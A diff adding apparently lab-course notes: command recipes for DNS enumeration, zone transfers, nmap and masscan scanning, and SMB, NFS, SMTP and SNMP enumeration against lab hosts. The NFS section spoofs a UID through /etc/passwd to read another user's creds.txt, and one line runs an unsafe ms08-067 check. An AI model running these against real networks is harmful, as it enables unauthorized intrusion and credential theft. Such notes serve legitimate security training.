@@ -1,0 +1,224 @@
+Interacting with a DNS Server 
+
+host www.megacorpone.com
+host -t mx megacorpone.com
+host -t txt megacorpone.com
+
+
+
+Automating Lookups 
+
+host www.megacorpone.com
+host idontexist.megacorpone.com
+ 
+ 
+ 
+Forward Lookup Brute Force 
+
+$ cat list.txt
+for ip in $(cat list.txt); do host $ip.megacorpone.com; done
+
+
+
+Reverse Lookup Brute Force
+for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
+ 
+ 
+ 
+DNS Zone Transfers
+ 
+host -l megacorpone.com ns1.megacorpone.com
+host -l megacorpone.com ns2.megacorpone.com
+host -t ns megacorpone.com | cut -d " " -f 4
+chmod +x dns-axfr.sh
+./dns-axfr.sh megacorpone.com
+
+
+
+DNSRecon
+
+dnsrecon -d megacorpone.com -t axfr
+cat list.txt 
+dnsrecon -d megacorpone.com -D ~/list.txt -t brt
+
+
+
+DNSenum 
+
+dnsenum zonetransfer.me
+
+
+
+TCP Scanning 
+
+nc -nvv -w 1 -z 10.11.1.220 3388-3390
+ 
+ 
+ 
+UDP Scanning 
+
+nc -nv -u -z -w 1 10.11.1.115 160-162
+
+
+
+Accountability for Our Traffic 
+
+sudo iptables -I INPUT 1 -s 10.11.1.220 -j ACCEPT
+sudo iptables -I OUTPUT 1 -d 10.11.1.220 -j ACCEPT
+sudo iptables -Z
+nmap 10.11.1.220
+sudo iptables -vn -L
+sudo iptables -Z
+nmap -p 1-65535 10.11.1.220
+sudo iptables -vn -L
+
+
+
+Stealth / SYN Scanning 
+
+sudo nmap -sS 10.11.1.220
+
+
+
+TCP Connect Scanning
+
+nmap -sT 10.11.1.220
+sudo nmap -sU 10.11.1.115
+sudo nmap -sS -sU 10.11.1.115
+nmap -sn 10.11.1.1-254
+nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
+grep Up ping-sweep.txt | cut -d " " -f 2
+nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
+grep open web-sweep.txt | cut -d" " -f2
+nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
+cat /usr/share/nmap/nmap-services 
+
+
+
+OS Fingerprinting
+
+sudo nmap -O 10.11.1.220
+
+
+
+Banner Grabbing/Service Enumeration 
+
+nmap -sV -sT -A 10.11.1.220
+
+
+
+
+Nmap Scripting Engine (NSE) 
+
+nmap 10.11.1.220 --script=smb-os-discovery
+nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
+nmap --script-help dns-zone-transfer
+
+
+
+
+Masscan 
+
+sudo apt install masscan
+sudo masscan -p80 10.0.0.0/8
+sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
+ 
+
+
+Scanning for the NetBIOS Service 
+
+nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
+sudo nbtscan -r 10.11.1.0/24
+
+
+
+Nmap SMB NSE Scripts 
+
+ls -1 /usr/share/nmap/scripts/smb*
+nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
+nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
+
+
+
+
+Scanning for NFS Shares 
+
+nmap -v -p 111 10.11.1.1-254
+nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
+
+
+
+
+Nmap NFS NSE Scripts 
+
+ls -1 /usr/share/nmap/scripts/nfs*
+nmap -p 111 --script nfs* 10.11.1.72
+mkdir home
+sudo mount -o nolock 10.11.1.72:/home ~/home/
+cd home/ && ls
+cd marcus
+ls -la
+-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt
+cat creds.txt
+sudo adduser pwn
+sudo sed -i -e 's/1001/1014/g' /etc/passwd
+cat /etc/passwd | grep pwn
+su pwn
+id
+cat creds.txt
+
+
+
+
+SMTP Enumeration 
+
+nc -nv 10.11.1.217 25
+VRFY root
+VRFY idontexist
+
+
+
+
+Scanning for SNMP 
+
+sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
+echo public > community
+echo private >> community
+echo manager >> community
+for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
+onesixtyone -c community -i ips
+
+
+
+
+Enumerating the Entire MIB Tree 
+
+snmpwalk -c public -v1 -t 10 10.11.1.14
+
+
+
+
+Enumerating Windows Users
+
+snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
+
+
+
+
+Enumerating Running Windows Processes
+
+snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
+
+
+
+
+
+Enumerating Open TCP Ports
+
+snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
+
+ 
+ 
+ 
+ 
